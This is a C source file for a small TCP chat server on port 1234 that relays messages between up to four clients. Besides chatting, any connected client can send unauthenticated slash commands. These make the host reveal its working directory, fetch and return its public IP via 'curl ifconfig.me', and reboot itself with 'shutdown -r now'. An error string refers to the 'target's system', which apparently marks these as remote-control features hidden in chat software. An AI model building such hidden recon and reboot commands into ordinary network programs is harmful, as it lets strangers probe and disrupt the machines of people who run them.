/*
 * Chat host script 
 * Manage clients and 
 * forward messages
 */

#include <stdio.h>
#include <stdlib.h> // import libraries
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>

#include <sys/socket.h>
#include <netinet/in.h>

#define MAX_CLIENT 4

struct client {
	int fd;
	char username[64];
};

int client_accept(int server_fd, struct sockaddr_in *address, struct client *id, int max_client) {
    socklen_t addrlen;
    int i;
	int fd;
    int ret;
	char buffer[64];

	memset(buffer, 0, sizeof(buffer));

    addrlen = sizeof(*address);
    ret = accept(server_fd, (struct sockaddr*)address, &addrlen);
		if (ret == -1) {
		perror("Error while accepting");
		return ret;
    }

	fd = ret;

    for (i = 0; i < max_client; i++) {
		if (id[i].fd == -1) {
			recv(fd, buffer, sizeof(buffer) - 1, 0);
			id[i].fd = fd;
			strcpy(id[i].username, buffer);
			printf("New client connected\n");
			return 0;
		}
    }

    printf("Too many clients, cannot accept\n");
    close(ret);
    return -EBUSY;
}

int client_handle_command_dir(char *msg, int msg_size) {
	int ret = 0;

	if (getcwd(msg, msg_size) == NULL) {
		strncpy(msg, "Cannot extract directory", msg_size);
		ret = errno;
	}

	return ret;
}

int client_handle_command_ip(char *msg, int msg_size) {
	FILE *pipe;
	int ret;

	pipe = popen("curl ifconfig.me -4", "r");
	if (pipe == NULL) {
		strncpy(msg, "Cannot extract IP address", msg_size);
		ret = errno;
		goto err_popen;
	}

	if (fgets(msg, msg_size, pipe) == NULL) {
		strncpy(msg, "Cannot read IP address", msg_size);
		ret = EIO;
		goto err_fgets;
	}

	ret = 0;

err_fgets:
	pclose(pipe);

err_popen:
	return ret;
}

int client_handle_command_reboot(char *msg, int msg_size) {
	int ret = 0;

	ret = system("shutdown -r now");
	if (ret == -1) {
		strncpy(msg, "Cannot reboot target's system", msg_size);
		ret = errno;
	}

	return ret;
}

int client_handle_disconnect(struct client *client, struct client *id, int max_client) {
    int i;
    for (i = 0; i < max_client; i++) {
        if (id[i].fd == client->fd) {
            printf("Disconnected client fd: %d\n", client->fd);
            id[i].fd = -1;
            close(client->fd);
        }
    }
    
    return 0;
}

int client_handle_command(struct client *client, char *buffer) {
    int ret;
	char msg_command[2048];
	int msg_command_size = sizeof(msg_command);
	
	if (strcmp(buffer, "/dir") == 0) {
		client_handle_command_dir(msg_command, msg_command_size);
	} else if (strcmp(buffer, "/ip") == 0) {
		client_handle_command_ip(msg_command, msg_command_size);
	} else if (strcmp(buffer, "/reboot") == 0) {
		client_handle_command_reboot(msg_command, msg_command_size);
	} else {
	    sprintf(msg_command, "Unknown command");
	}
	
    ret = send(client->fd, msg_command, strlen(msg_command), 0);
    if (ret == -1) {
        perror("Error while sending");
    }
    
    return ret;
}

int client_handle_message(struct client *client, char *buffer, struct client *id, int max_client) {
	int i;
	char *space = ": ";

	printf("%s", client->username);
	printf(": ");
	printf("%s\n", buffer);

    for (i = 0; i < max_client; i++) {
        if ((id[i].fd != -1) && (id[i].fd != client->fd)) {
			send(id[i].fd, client->username, strlen(client->username), 0);
			send(id[i].fd, space, strlen(space), 0);
            send(id[i].fd, buffer, strlen(buffer), 0);
        }
    }
    
    return 0;
}

int client_handle(struct client *client, struct client *id, int max_client) {
	char buffer[2048];
	int ret;

	memset(buffer, 0, sizeof(buffer));
	
	ret = recv(client->fd, buffer, sizeof(buffer) - 1, 0);
	if (ret == -1) {
		perror("Error while receiving");
		return ret;
	} else if (ret == 0) {
	    ret = client_handle_disconnect(client, id, max_client);
	} else {
        if (buffer[0] == '/') {
            ret = client_handle_command(client, buffer);
        } else {
            ret = client_handle_message(client, buffer, id, max_client);
        }
	}
	
	return ret;
}

int main() {
	int server_fd;
	int opt;
	int i;
	int j;
	struct sockaddr_in address;
	struct client id[MAX_CLIENT];
	struct pollfd fds[1 + MAX_CLIENT];
	int fd_num;
	int ret;

	/* Create server socket */
	ret = socket(AF_INET, SOCK_STREAM, 0); // create TCP socket
	if (ret == -1) {
		perror("Socket creation failed");
		exit(EXIT_FAILURE);
	}
	server_fd = ret;

	opt = 1;
	ret = setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
	if (ret == -1) {
	  perror("setsockopt(SO_REUSEADDR) failed");
	}
	
	address.sin_family = AF_INET;		  // struct to define type,
	address.sin_addr.s_addr = INADDR_ANY; // address and port to use
	address.sin_port = htons(1234);
	
	if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) == -1) {
		perror("Error while binding");
		exit(EXIT_FAILURE);
	}
	
	if (listen(server_fd, 10) == -1) {
		perror("Error while listening");
		exit(EXIT_FAILURE);
	}

	memset(id, 0, sizeof(id));

	for (i = 0; i < MAX_CLIENT; i++) {
		id[i].fd = -1;
	}

	while (1) {
	    memset(fds, 0, sizeof(fds));

	    fd_num = 0;
	    fds[fd_num].fd = server_fd;
	    fds[fd_num].events = POLLIN;
	    fd_num++;  
	    
	    for (i = 0; i < MAX_CLIENT; i++) {
			if (id[i].fd != -1) {
				fds[fd_num].fd = id[i].fd;
				fds[fd_num].events = POLLIN;
				fd_num++;
			}
	    }
		
	    ret = poll(fds, fd_num, -1);
	    if (ret == -1) {
			perror("Error while polling");
			break;
	    }

	    for (i = 0; i < fd_num; i++) {
			if (fds[i].revents & POLLIN) {
				if (i == 0) {
				    /* The server socket is signaled, process incoming connection */
				    client_accept(server_fd, &address, id, MAX_CLIENT);
				} else {
				    /* Client socket, process message */
					struct client *client = NULL;

					for (j = 0; j < MAX_CLIENT; j++) {
						if (fds[i].fd == id[j].fd) {
							client = &id[j];
						}
					}

				    client_handle(client, id, MAX_CLIENT);
				}
			}
	    }
	}

	return 0;
}
